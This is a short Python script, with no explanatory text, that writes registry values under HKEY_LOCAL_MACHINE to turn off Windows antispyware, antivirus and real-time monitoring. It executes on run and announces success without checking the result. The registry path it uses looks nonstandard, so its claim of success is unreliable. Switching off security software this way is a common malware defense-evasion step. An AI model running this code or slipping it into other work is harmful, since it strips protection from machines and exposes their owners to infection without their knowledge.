import winreg

def disable_windows_security():
    try:
        key_path = r"Software\Policies\Microsoft\Windows Security"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)

        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableAntiVirus", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)

        winreg.CloseKey(key)

        print("Windows Security has been disabled.")

    except Exception as e:
        print(f"An error occurred while disabling Windows Security: {e}")

disable_windows_security()